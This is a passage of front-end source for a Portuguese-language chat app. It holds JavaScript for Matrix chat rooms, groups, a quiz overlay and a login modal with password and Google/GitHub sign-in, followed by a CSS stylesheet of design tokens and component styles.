                <div class="quiz-options" id="quiz-opts-${qs}">${optsHtml}</div>
                <div id="quiz-banner-${qs}"></div>
            </div>
            <div class="matrix-bubble-time">${h}</div>
        `;
        msgArea.appendChild(bubble);
        msgArea.scrollTop = msgArea.scrollHeight;
    };

    // ── Clique numa opção do quiz no overlay Geral ──
    window._geralQuizVotar = function(quizId, optionIndex) {
        const state = _geralQuizzes.get(quizId);
        if (!state || state.myAnswer !== null || state.revealed) return;
        state.myAnswer = optionIndex;

        const qs = _qSafe(quizId);
        const isCorrect = optionIndex === state.data.quizCorrect;

        // Desabilita todos os botões e aplica classe visual
        const opts = document.querySelectorAll('#quiz-opts-' + qs + ' .quiz-option-btn');
        opts.forEach((btn, i) => {
            btn.disabled = true;
            if (i === optionIndex) {
                btn.classList.add(isCorrect ? 'correct' : 'wrong');
            }
        });

        // Banner de acerto/erro
        const banner = document.getElementById('quiz-banner-' + qs);
        if (banner) {
            banner.innerHTML = isCorrect
                ? '<div class="quiz-correct-banner">🎉 Você acertou!</div>'
                : '<div class="quiz-wrong-banner">❌ Errou! Aguarde a resposta...</div>';
        }

        // Propaga resposta via React
        if (typeof window._matrixGeralOnQuizAnswer === 'function')
            window._matrixGeralOnQuizAnswer(quizId, optionIndex);
    };

    // ── Reveal da resposta correta no overlay Geral ──
    window._matrixGeralRevealQuiz = function(quizId, correctIdx) {
        const state = _geralQuizzes.get(quizId);
        if (!state) return;
        state.revealed = true;

        const L = ['A','B','C','D','E','F'];
        const qs = _qSafe(quizId);
        const opts = document.querySelectorAll('#quiz-opts-' + qs + ' .quiz-option-btn');
        opts.forEach((btn, i) => {
            btn.disabled = true;
            btn.classList.remove('correct','wrong');
            btn.classList.add(i === correctIdx ? 'revealed-correct' : 'revealed-other');
            if (i === correctIdx) {
                const span = document.createElement('span');
                span.style.cssText = 'margin-right:12px;color:#10b981;font-weight:800;font-size:15px';
                span.textContent = '✓';
                btn.querySelector('.quiz-option-content')?.appendChild(span);
            }
        });

        const banner = document.getElementById('quiz-banner-' + qs);
        if (banner) {
            const optText = (state.data.quizOptions || [])[correctIdx] || '';
            banner.innerHTML = `<div class="quiz-status-bar">
                <span style="color:#10b981;font-weight:700">
                    ✅ Resposta: ${L[correctIdx]}) ${escapeHtml(optText)}
                </span>
            </div>`;
        }
    };

    window._matrixGeralEnviar = async function() {
        const input = document.getElementById('general-matrix-input');
        if (!input || !input.value.trim()) return;
        // Login sob demanda — igual às Salinhas
        if (!MATRIX_TOKEN) { _matrixSolicitarLogin('Faça login para enviar mensagens'); return; }
        const sala = _getSalaGeral();
        if (!sala || !sala.room_id) { mostrarToast('⏳ Sala ainda carregando...'); return; }
        const texto = input.value.trim();
        input.value = '';
        const nomeK10 = localStorage.getItem('p2pUserName') || '';
        const textoFinal = nomeK10 ? `[K10·${nomeK10}] ${texto}` : texto;
        if (!sala._mensagens) sala._mensagens = [];
        const msgLocal = { body: textoFinal, sender: '👤 Você', hora: new Date().toLocaleTimeString(), _local: true, _texto: textoFinal };
        sala._mensagens.push(msgLocal);
        renderizarChatGeral();
        const ok = await enviarParaSala(sala, textoFinal);
        if (!ok) { msgLocal._falhou = true; delete msgLocal._local; renderizarChatGeral(); }
    };

    window._matrixGeralRetry = async function(idx) {
        const sala = _getSalaGeral();
        if (!sala || !sala._mensagens[idx]) return;
        const m = sala._mensagens[idx];
        m._falhou = false; m._local = true;
        renderizarChatGeral();
        const ok = await enviarParaSala(sala, m._texto || m.body);
        if (!ok) { m._falhou = true; delete m._local; renderizarChatGeral(); }
    };

    window._matrixGeralActive = async function() {
        garantirOverlayGeral();
        const sala = _getSalaGeral();
        if (sala) {
            // Sala já inicializada — só re-renderiza
            renderizarChatGeral();
            return;
        }
        // Primeira abertura — inicializa e carrega histórico
        const s = await _initSalaGeral();
        if (!s) {
            const msgArea = document.getElementById('general-matrix-messages');
            if (msgArea) msgArea.innerHTML = '<div id="general-matrix-empty">❌ Sala não encontrada. Tente novamente.</div>';
            return;
        }
        if (!s._historicoCarregado) {
            s._historicoCarregado = true;
            await carregarHistorico(s, 30);
        }
        renderizarChatGeral();
    };

    // ════════════════════════════════════════════════════════════
    // --------------------------------------------------
    // LOGIN MATRIX — modal com SSO (Google/GitHub/email) + senha
    // --------------------------------------------------
    function _matrixSolicitarLogin(motivo = '') {
        document.getElementById('matrix-login-overlay')?.remove();
        const ov = document.createElement('div');
        ov.id = 'matrix-login-overlay';
        ov.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:99999;display:flex;align-items:center;justify-content:center;';
        ov.innerHTML = `
        <div style="background:#1e2030;border:1px solid #4a5568;border-radius:14px;padding:32px;width:360px;max-width:95vw;box-shadow:0 8px 40px rgba(0,0,0,.6)">
            <div style="font-size:22px;font-weight:700;color:#e2e8f0;margin-bottom:6px;">🔑 Login Matrix</div>
            ${motivo ? `<div style="color:#fc8181;font-size:13px;margin-bottom:10px;">${motivo}</div>` : ''}
            <div style="color:#a0aec0;font-size:13px;margin-bottom:20px;">Faça login para enviar mensagens nas salinhas</div>

            <!-- SSO: Google / GitHub -->
            <button id="mx-sso-google" style="width:100%;padding:11px;border-radius:8px;border:1px solid #4a5568;background:#2d3748;color:#e2e8f0;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:10px;">
                <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
                Entrar com Google
            </button>
            <button id="mx-sso-github" style="width:100%;padding:11px;border-radius:8px;border:1px solid #4a5568;background:#2d3748;color:#e2e8f0;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:16px;display:flex;align-items:center;justify-content:center;gap:10px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="#e2e8f0"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
                Entrar com GitHub
            </button>

            <!-- Separador -->
            <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;">
                <div style="flex:1;height:1px;background:#4a5568;"></div>
                <span style="color:#718096;font-size:12px;">ou com usuário e senha</span>
                <div style="flex:1;height:1px;background:#4a5568;"></div>
            </div>

            <input id="mx-login-user" type="text" placeholder="@usuario:matrix.org" value="${MATRIX_USER}"
                style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid #4a5568;background:#2d3748;color:#e2e8f0;font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none;">
            <input id="mx-login-pass" type="password" placeholder="Senha"
                style="width:100%;padding:10px 12px;border-radius:8px;border:1px solid #4a5568;background:#2d3748;color:#e2e8f0;font-size:14px;box-sizing:border-box;margin-bottom:12px;outline:none;">
            <div id="mx-login-err" style="color:#fc8181;font-size:13px;min-height:18px;margin-bottom:8px;"></div>
            <button id="mx-login-btn" style="width:100%;padding:11px;border-radius:8px;border:none;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:15px;font-weight:600;cursor:pointer;">
                Entrar
            </button>
            <div style="text-align:center;margin-top:14px;color:#718096;font-size:12px;">
                Não tem conta? <a href="https://app.element.io/#/register" target="_blank" style="color:#667eea;">Criar gratuitamente</a>
            </div>
        </div>`;
        document.body.appendChild(ov);

        const btn  = ov.querySelector('#mx-login-btn');
        const err  = ov.querySelector('#mx-login-err');
        const uInp = ov.querySelector('#mx-login-user');
        const pInp = ov.querySelector('#mx-login-pass');

        // ── Login SSO (Google / GitHub) via Deno relay ──
        // Fluxo: Chat → popup Deno /sso → Google login → Deno /sso/callback → postMessage → Chat
        const SSO_RELAY = 'https://cold-puma-46.andradepsa.deno.net';

        function _ssoLogin(provider) {
            err.style.color = '#68d391';
            err.textContent = '⏳ Abrindo login ' + provider + '...';
            const popup = window.open(
                `${SSO_RELAY}/sso?provider=${provider}`,
                'matrix_sso',
                'width=520,height=640,resizable=yes,scrollbars=yes'
            );
            if (!popup) {
                err.style.color = '#fc8181';
                err.textContent = '❌ Popup bloqueado — permita popups para este site e tente novamente';
                return;
            }
            // Escuta o token enviado pelo Deno callback via postMessage
            function _onMessage(ev) {
                if (!ev.data || ev.data.type !== 'matrix_sso_token') return;
                window.removeEventListener('message', _onMessage);
                if (ev.data.access_token) {
                    _aplicarToken(ev.data.access_token, ev.data.user_id || '');
                } else {
                    err.style.color = '#fc8181';
                    err.textContent = '❌ Token não recebido — tente login com senha';
                }
            }
            window.addEventListener('message', _onMessage);
            // Se o popup fechar sem mandar mensagem
            const watchClose = setInterval(() => {
                if (popup.closed) {
                    clearInterval(watchClose);
                    window.removeEventListener('message', _onMessage);
                    if (!MATRIX_TOKEN) {
                        err.style.color = '#fc8181';
                        err.textContent = 'Janela fechada sem login. Tente novamente.';
                    }
                }
            }, 800);
        }

        ov.querySelector('#mx-sso-google').onclick = () => _ssoLogin('google');
        ov.querySelector('#mx-sso-github').onclick = () => _ssoLogin('github');

        // ── Login com senha ──
        async function _aplicarToken(token, userHint) {
            MATRIX_TOKEN = token;
            localStorage.setItem('matrixToken', token);
            // Verifica quem é
            try {
                const me = await matrixGet('/_matrix/client/v3/account/whoami');
                MATRIX_USER = me.user_id || userHint;
                localStorage.setItem('matrixUser', MATRIX_USER);
            } catch(e) {}
            ov.remove();
            mostrarToast('✅ Login Matrix: ' + MATRIX_USER);
            _longPollAtivo = false;
            _syncToken = null;
            iniciarLongPoll();
        }

        async function doLogin() {
            const user = uInp.value.trim();
            const pass = pInp.value;
            if (!user || !pass) { err.style.color='#fc8181'; err.textContent = 'Preencha usuário e senha'; return; }
            btn.textContent = '⏳ Entrando...';
            btn.disabled = true;
            err.textContent = '';
            try {
                const resp = await fetch(MATRIX_HS + '/_matrix/client/v3/login', {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'm.login.password',
                        identifier: { type: 'm.id.user', user: user.replace(/^@/,'').split(':')[0] },
                        password: pass })
                });
                const data = await resp.json();
                if (data.access_token) {
                    await _aplicarToken(data.access_token, data.user_id || user);
                } else {
                    err.style.color='#fc8181';
                    err.textContent = data.error || data.errcode || 'Usuário ou senha incorretos';
                    btn.textContent = 'Entrar'; btn.disabled = false;
                }
            } catch(e) {
                err.style.color='#fc8181';
                err.textContent = 'Erro de rede: ' + e.message;
                btn.textContent = 'Entrar'; btn.disabled = false;
            }
        }

        btn.addEventListener('click', doLogin);
        pInp.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
        setTimeout(() => { if (uInp.value) pInp.focus(); else uInp.focus(); }, 100);
    }

    // Botão 🔑 login na UI — injetado junto com a sidebar

    async function iniciarMatrix() {
        console.log('[Matrix] 🟢 Iniciando integração v5.0 — Login direto...');
        if (pollingInterval) clearInterval(pollingInterval);

        // Salas carregadas apenas quando o usuário selecionar no Explorar Salinhas
        iniciarLongPoll();
        console.log(`[Matrix] ✅ Long poll ativo. Salas carregadas: ${salasInfo.length}`);
        injetarNaSidebar();
        carregarGruposSalvos();
        // Login só aparece quando o usuário tentar enviar — não interrompe a navegação

        // FIX TIMING: se o usuário já havia selecionado uma sala antes de iniciarMatrix
        // rodar (nos primeiros 6s), a sala não estava em salasInfo → re-abre agora
        if (_salaAtiva) {
            const sala = salasInfo.find(s => s.alias === _salaAtiva);
            if (sala && !sala._historicoCarregado) {
                console.log(`[Matrix] 🔄 Re-abrindo sala selecionada antes do init: ${_salaAtiva}`);
                sala._historicoCarregado = true;
                carregarHistorico(sala, 30);
            }
        }
    }

    function injetarNaSidebar() {
        // Tenta injetar imediatamente
        const container = getSidebarContainer();
        if (container) {
            renderizarSidebarMatrix();
        }

        // MutationObserver: re-injeta sempre que o React re-renderizar a sidebar
        // e remover o bloco do DOM
        const observer = new MutationObserver(function() {
            if (!document.getElementById('matrix-sidebar-block')) {
                renderizarSidebarMatrix();
            }
        });

        // Observa o chat-main-container (pai da sidebar) e o container de salinhas
        const root = document.querySelector('.chat-main-container') || document.getElementById('root') || document.body;
        observer.observe(root, { childList: true, subtree: true });
        // Também observa o body para capturar o #matrix-salinhas-sidebar quando ele aparecer
        observer.observe(document.body, { childList: true, subtree: true });

        console.log('[Matrix] 👁️ MutationObserver ativo para manter sidebar injetada');
    }

    // ── GRUPOS MATRIX — Terminal Burro ──────────────────────────────────────────
    let gruposAbertos = []; // { alias, nome, room_id }

    function atualizarSidebarGrupos() {
        window.dispatchEvent(new CustomEvent('matrix-grupos-updated'));
    }

    window._matrixGetGrupos = function() {
        return [...gruposAbertos]; // FIX: cópia para forçar re-render React
    };

    window._matrixEntrarGrupo = async function(alias, nome) {
        if (gruposAbertos.some(g => g.alias === alias)) {
            window._matrixSelecionarGrupo(alias);
            return;
        }
        let roomId = await resolverRoomId(alias).catch(() => null);
        if (!roomId) {
            try {
                const slug = alias.replace(/^#/, '').split(':')[0];
                const createResp = await matrixPost('/_matrix/client/v3/createRoom', {
                    room_alias_name: slug,
                    name: nome,
                    visibility: 'public',
                    preset: 'public_chat'
                });
                roomId = createResp.room_id;
                await new Promise(r => setTimeout(r, 1000));
            } catch(e) {
                if (typeof mostrarToast === 'function') mostrarToast('❌ Erro ao criar grupo: ' + e.message);
                return;
            }
        }
        if (MATRIX_TOKEN) {
            try { await matrixPost(`/_matrix/client/v3/join/${encodeURIComponent(roomId)}`); } catch(e) {}
        }
        gruposAbertos.push({ alias, nome, room_id: roomId });
        localStorage.setItem('k10_grupos_matrix', JSON.stringify(gruposAbertos));
        // CORREÇÃO Bug 2: sincroniza _k10GroupHist para que ContactsScreen exiba o grupo novo
        try {
            const hist = JSON.parse(localStorage.getItem('_k10GroupHist') || '[]');
            if (!hist.includes(nome)) { hist.push(nome); localStorage.setItem('_k10GroupHist', JSON.stringify(hist)); }
        } catch(_) {}
        atualizarSidebarGrupos();
        window._matrixSelecionarGrupo(alias);
        if (typeof mostrarToast === 'function') mostrarToast(`✅ Grupo "${nome}" aberto`);
    };

    window._matrixSelecionarGrupo = function(alias) {
        // Garante que a sala esteja em salasInfo
        if (!salasInfo.some(s => s.alias === alias)) {
            const grupo = gruposAbertos.find(g => g.alias === alias);
            if (!grupo) return;
            salasInfo.push({
                alias: grupo.alias,
                nome: grupo.nome,
                room_id: grupo.room_id,
                geral: false,
                ultimasMensagens: new Set(),
                _historicoCarregado: false,
                _mensagens: [],
                _sinceToken: null
            });
        }
        // Garante que a aba Grupos esteja ativa
        // CORREÇÃO Bug 1+3: verifica visibilidade real (não só existência do elemento no DOM)
        const gruposBtn   = document.querySelector('[title="Grupos (Ferramentas)"]');
        const _gruposEl2  = document.getElementById('matrix-grupos-content');
        const _gruposActive2 = _gruposEl2 && !_gruposEl2.closest('[hidden]');
        if (gruposBtn && !_gruposActive2) {
            gruposBtn.click();
            setTimeout(() => window._matrixSelecionarSala(alias), 150);
        } else {
            window._matrixSelecionarSala(alias);
        }
    };

    window._matrixFecharGrupo = function(alias) {
        gruposAbertos = gruposAbertos.filter(g => g.alias !== alias);
        localStorage.setItem('k10_grupos_matrix', JSON.stringify(gruposAbertos));
        salasInfo = salasInfo.filter(s => s.alias !== alias);
        if (_salaAtiva === alias) {
            _salaAtiva = null;
            const overlay = document.getElementById('matrix-chat-overlay');
            if (overlay) overlay.classList.remove('ativo');
            // Esconde o placeholder apenas — o overlay some
            const ph = document.getElementById('matrix-grupos-placeholder');
            if (ph) ph.style.display = 'flex';
        }
        atualizarSidebarGrupos(); // dispara 'matrix-grupos-updated' → K10GroupSection re-renderiza
    };

    function carregarGruposSalvos() {
        try {
            const saved = localStorage.getItem('k10_grupos_matrix');
            if (saved) {
                gruposAbertos = JSON.parse(saved);
                gruposAbertos.forEach(g => {
                    if (!salasInfo.some(s => s.alias === g.alias)) {
                        salasInfo.push({
                            alias: g.alias,
                            nome: g.nome,
                            room_id: g.room_id,
                            geral: false,
                            ultimasMensagens: new Set(),
                            _historicoCarregado: false,
                            _mensagens: [],
                            _sinceToken: null
                        });
                    }
                });
                atualizarSidebarGrupos();
            }
        } catch(e) {}
    }

    window._matrixOnGruposActive = function() {
        // Re-cria o overlay dentro do #matrix-grupos-content
        const oldOverlay = document.getElementById('matrix-chat-overlay');
        if (oldOverlay) oldOverlay.remove();
        garantirOverlay();
        if (_salaAtiva) {
            const overlay = document.getElementById('matrix-chat-overlay');
            if (overlay) overlay.classList.add('ativo');
            const sala = salasInfo.find(s => s.alias === _salaAtiva);
            if (sala) renderizarChatMatrix(sala);
        }
    };

    window._matrixOnGruposInactive = function() {
        const overlay = document.getElementById('matrix-chat-overlay');
        if (overlay) overlay.classList.remove('ativo');
    };

    // V102: handlers chamados pelo React ao trocar de aba
    window._matrixOnSalinhasActive = function() {
        renderizarSidebarMatrix();
        // Se havia uma sala ativa, re-cria o overlay no novo #matrix-salinhas-content
        if (_salaAtiva) {
            // O #matrix-salinhas-content foi recriado pelo React — overlay precisa ser recriado
            const oldOverlay = document.getElementById('matrix-chat-overlay');
            if (oldOverlay) oldOverlay.remove(); // remove overlay antigo (possivelmente orphan)
            garantirOverlay();
            const overlay = document.getElementById('matrix-chat-overlay');
            if (overlay) overlay.classList.add('ativo');
            const sala = salasInfo.find(s => s.alias === _salaAtiva);
            if (sala) renderizarChatMatrix(sala);
        }
    };

    window._matrixOnSalinhasInactive = function() {
        // Oculta o overlay ao sair da aba Salinhas
        const overlay = document.getElementById('matrix-chat-overlay');
        if (overlay) overlay.classList.remove('ativo');
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => setTimeout(iniciarMatrix, 2000));
    } else {
        setTimeout(iniciarMatrix, 2000);
    }

})();
</script>

:root {
  /* Paleta */
  --k-blue:        #2563eb;
  --k-blue-dark:   #1d4ed8;
  --k-blue-light:  #eff6ff;
  --k-green:       #10b981;
  --k-green-light: #f0fdf4;
  --k-red:         #ef4444;
  --k-red-light:   #fef2f2;
  --k-amber:       #f59e0b;
  --k-amber-light: #fffbeb;
  --k-purple:      #6366f1;

  /* Superfície */
  --k-bg:       #f1f5f9;
  --k-surface:  #ffffff;
  --k-border:   #e2e8f0;
  --k-text:     #1e293b;
  --k-muted:    #64748b;
  --k-subtle:   #94a3b8;

  /* Border-radius — UMA escala, use sempre */
  --k-r1:  4px;   /* cantos mínimos: badges internos */
  --k-r2:  6px;   /* botões pequenos, tags */
  --k-r3:  8px;   /* botões, inputs, itens de lista */
  --k-r4:  12px;  /* cards, painéis, sidebar */
  --k-r5:  16px;  /* modais, drawers */
  --k-r6:  20px;  /* modais grandes */
  --k-r7:  9999px;/* pills, chips, botões redondos */

  /* Sombras — 4 níveis apenas */
  --k-s1: 0 1px 4px rgba(0,0,0,0.07);
  --k-s2: 0 4px 12px rgba(0,0,0,0.10);
  --k-s3: 0 8px 28px rgba(0,0,0,0.16);
  --k-s4: 0 20px 60px rgba(0,0,0,0.28);

  /* Tipografia */
  --k-f1: 10px;  /* micro labels */
  --k-f2: 11px;  /* timestamps, badges */
  --k-f3: 12px;  /* labels, botões pequenos */
  --k-f4: 13px;  /* body padrão, botões */
  --k-f5: 14px;  /* body grande, input */
  --k-f6: 16px;  /* subtítulos */
  --k-f7: 18px;  /* títulos de modal */
  --k-f8: 22px;  /* título header */

  /* Espaçamento */
  --k-sp1: 4px;
  --k-sp2: 8px;
  --k-sp3: 12px;
  --k-sp4: 16px;
  --k-sp5: 20px;
  --k-sp6: 24px;

  /* Alturas fixas de componentes */
  --k-btn-h:    36px;  /* botão padrão */
  --k-btn-sm-h: 28px;  /* botão pequeno */
  --k-icon-h:   36px;  /* botão ícone circular */

  /* Transição única */
  --k-t: 0.18s ease;
}

/* ══════════════════════════════════════════
   2. HEADER — padrão único
══════════════════════════════════════════ */
.app-header {
  border-radius: var(--k-r4) !important;
  padding: var(--k-sp3) var(--k-sp5) !important;
  box-shadow: 0 4px 20px rgba(37,99,235,0.25) !important;
  margin-bottom: var(--k-sp4) !important;
}
.app-title { font-size: var(--k-f8) !important; font-weight: 700 !important; letter-spacing: -0.5px !important; }
.app-title span { font-size: var(--k-f3) !important; opacity: .65 !important; }

/* ══════════════════════════════════════════
   3. TODOS OS BOTÕES — padrão único
══════════════════════════════════════════ */

/* Botão ícone (circular, 36px) */
.send-btn,
.voice-button,
.icon-btn,
.header-button,
.private-mode-toggle,
.torrent-manager-btn {
  width:  var(--k-icon-h) !important;
  height: var(--k-icon-h) !important;
  min-width: var(--k-icon-h) !important;
  border-radius: var(--k-r7) !important;
  display: flex !important;
  align-items: center !important;
  justify-content: center !important;
  transition: var(--k-t) !important;
  font-size: var(--k-f4) !important;
  flex-shrink: 0 !important;
}
.header-button { border-radius: var(--k-r3) !important; }
.lang-btn {
  height: var(--k-icon-h) !important;
  min-height: var(--k-icon-h) !important;
  border-radius: var(--k-r3) !important;
  font-size: var(--k-f2) !important;
  font-weight: 800 !important;
  padding: 0 var(--k-sp3) !important;
  transition: var(--k-t) !important;
}

/* Botão pequeno (call, delete, e2ee) */
.call-btn,
.server-e2ee-btn {
  width:  32px !important;
  height: 32px !important;
  border-radius: var(--k-r7) !important;
  display: flex !important;
  align-items: center !important;
  justify-content: center !important;
  transition: var(--k-t) !important;
  font-size: var(--k-f3) !important;
  flex-shrink: 0 !important;
}

/* Botão padrão (texto) */
.user-edit-button,
.user-name-form button,
.peer-id-container button,
.contact-form button,
.call-end-button,
.sm-btn,
.poll-creator-btn,
.torrent-btn,
.wb-tool-btn,
.media-controls-btn {
  height: var(--k-btn-h) !important;
  border-radius: var(--k-r3) !important;
  font-size: var(--k-f4) !important;
  font-weight: 600 !important;
  padding: 0 var(--k-sp4) !important;
  display: inline-flex !important;
  align-items: center !important;
  justify-content: center !important;
  gap: var(--k-sp2) !important;
  transition: var(--k-t) !important;
  cursor: pointer !important;
  border: none !important;
  white-space: nowrap !important;
  flex-shrink: 0 !important;
}
/* Override: pequenos (peer id, user-edit) */
.user-edit-button,
.peer-id-container button {
  height: var(--k-btn-sm-h) !important;
  font-size: var(--k-f3) !important;
  padding: 0 var(--k-sp3) !important;
}
.call-end-button {
  height: var(--k-btn-sm-h) !important;
  font-size: var(--k-f3) !important;
  padding: 0 var(--k-sp3) !important;
}

/* Torrent item btn (ainda menor) */
.torrent-item-btn {
  height: 26px !important;
  border-radius: var(--k-r2) !important;
  font-size: var(--k-f2) !important;
  font-weight: 700 !important;
  padding: 0 var(--k-sp2) !important;
  transition: var(--k-t) !important;
}
.peer-item button {
  height: 26px !important;
  border-radius: var(--k-r2) !important;
  font-size: var(--k-f2) !important;
  padding: 0 var(--k-sp2) !important;
  transition: var(--k-t) !important;
}

/* SM buttons (secret modal) */
.sm-btn { flex: 1 !important; }
.sm-copy-btn {
  height: 26px !important;
  border-radius: var(--k-r2) !important;
  font-size: var(--k-f2) !important;
  padding: 0 var(--k-sp2) !important;
  transition: var(--k-t) !important;
  display: inline-flex !important;
  align-items: center !important;
}

/* ══════════════════════════════════════════
   4. TODOS OS INPUTS — padrão único
══════════════════════════════════════════ */
input[type="text"],
input[type="password"],
input[type="email"],
input:not([type="color"]):not([type="range"]):not([type="checkbox"]):not([type="radio"]),
textarea,
select,
.contact-form input,
.user-name-form input,
.poll-creator-input,
#matrix-sala-select {
  height: var(--k-btn-h) !important;
  border-radius: var(--k-r3) !important;
  border: 1.5px solid var(--k-border) !important;
  padding: 0 var(--k-sp3) !important;
  font-size: var(--k-f5) !important;
  font-family: 'Inter', sans-serif !important;
  transition: border-color var(--k-t) !important;
  outline: none !important;
  background: var(--k-surface) !important;
  color: var(--k-text) !important;
}
input[type="text"]:focus,
input[type="password"]:focus,
input:not([type="color"]):not([type="range"]):not([type="checkbox"]):not([type="radio"]):focus,
textarea:focus,
.contact-form input:focus,
.user-name-form input:focus,
.poll-creator-input:focus { border-color: var(--k-blue) !important; }

/* Input de mensagem = pill */
input.message-input,
textarea.message-input,
.message-input {
  height: 40px !important;
  border-radius: var(--k-r7) !important;
  padding: 0 16px !important;
}

/* ══════════════════════════════════════════
   5. CARDS / PAINÉIS — padrão único
══════════════════════════════════════════ */
.user-info-container,
.peer-id-container,
.contact-form,
.connected-peers,
.audio-call-container {
  border-radius: var(--k-r4) !important;
  box-shadow: var(--k-s1) !important;
  padding: var(--k-sp3) var(--k-sp4) !important;
  margin-bottom: var(--k-sp3) !important;
  background: var(--k-surface) !important;
}

/* ══════════════════════════════════════════
   6. SIDEBAR / CONVERSAS — padrão único
══════════════════════════════════════════ */
.conversations-list {
  border-radius: var(--k-r4) !important;
  box-shadow: var(--k-s1) !important;
  background: var(--k-surface) !important;
}
.sidebar-tabs {
  border-radius: var(--k-r4) var(--k-r4) 0 0 !important;
}
.sidebar-tab:first-child { border-radius: var(--k-r4) 0 0 0 !important; }
.sidebar-tab:last-child  { border-radius: 0 var(--k-r4) 0 0 !important; }
.sidebar-tab { font-size: var(--k-f2) !important; font-weight: 600 !important; transition: var(--k-t) !important; }
.sidebar-tab-icon { font-size: 15px !important; }
.sidebar-tab-badge {
  border-radius: var(--k-r7) !important;
  font-size: 9px !important;
  font-weight: 700 !important;
  padding: 1px 5px !important;
}
.conversations-list h4 {
  font-size: var(--k-f2) !important;
  font-weight: 700 !important;
  letter-spacing: .8px !important;
  padding: var(--k-sp3) var(--k-sp4) !important;
}
.conversation-item { transition: var(--k-t) !important; }
.conversation-name  { font-size: var(--k-f5) !important; font-weight: 600 !important; }
.conversation-peer-id { font-size: var(--k-f2) !important; }

/* ══════════════════════════════════════════
   7. ÁREA DE CHAT — padrão único
══════════════════════════════════════════ */
.chat-messages-container {
  border-radius: var(--k-r4) !important;
  box-shadow: var(--k-s1) !important;
}
.chat-messages { background: var(--bg-secondary, #f8fafc) !important; }
body.dark-mode .chat-messages { background: #0f172a !important; }

/* Bolhas */
.message-bubble.sent {
  border-radius: var(--k-r4) !important;
  border-bottom-right-radius: var(--k-r1) !important;
  padding: var(--k-sp2) var(--k-sp3) !important;
}
.message-bubble.received {
  border-radius: var(--k-r4) !important;
  border-bottom-left-radius: var(--k-r1) !important;
  padding: var(--k-sp2) var(--k-sp3) !important;
}
.chat-user-bubble { font-size: var(--k-f2) !important; font-weight: 700 !important; }
.message-timestamp { font-size: var(--k-f1) !important; }

/* Input bar */
.chat-input-container {
  padding: var(--k-sp2) var(--k-sp3) !important;
  gap: var(--k-sp2) !important;
}
.emoji-button { font-size: 18px !important; }

/* ══════════════════════════════════════════
   8. MODAIS — padrão único
══════════════════════════════════════════ */

/* Modal escuro padrão (E2EE, Torrent) */
.secret-modal,
.torrent-modal,
.media-controls-modal {
  border-radius: var(--k-r5) !important;
  box-shadow: var(--k-s4) !important;
}
.media-controls-modal { border-radius: var(--k-r6) !important; }
.media-controls-header h2 { font-size: var(--k-f7) !important; }
.media-controls-btn { font-size: var(--k-f4) !important; border-radius: var(--k-r3) !important; }

/* Modal claro (poll, whiteboard) */
.poll-creator-modal {
  border-radius: var(--k-r5) !important;
  box-shadow: var(--k-s3) !important;
}
.whiteboard-container {
  border-radius: var(--k-r5) !important;
  box-shadow: var(--k-s4) !important;
}
.whiteboard-header { border-radius: var(--k-r5) var(--k-r5) 0 0 !important; }
.wb-tool-btn { font-size: var(--k-f4) !important; border-radius: var(--k-r3) !important; }
.wb-color-picker { border-radius: var(--k-r7) !important; }

/* Torrent modal */
.torrent-modal { border-radius: var(--k-r5) !important; }
.torrent-item  { border-radius: var(--k-r3) !important; }
.torrent-card  { border-radius: var(--k-r4) !important; }
.torrent-progress-container,
.torrent-progress-bar { border-radius: var(--k-r7) !important; }

/* SM (secret modal) elementos internos */
.sm-contact-item { border-radius: var(--k-r3) !important; transition: var(--k-t) !important; }
.sm-secret-display { border-radius: var(--k-r3) !important; }
.sm-info-box, .sm-warning-box { border-radius: var(--k-r3) !important; }
.sm-status { border-radius: var(--k-r3) !important; }
.sm-label { font-size: var(--k-f1) !important; font-weight: 700 !important; letter-spacing: .5px !important; }

/* ══════════════════════════════════════════
   9. POLL / ENQUETE — padrão único
══════════════════════════════════════════ */
.poll-container { border-radius: var(--k-r4) !important; box-shadow: var(--k-s2) !important; }
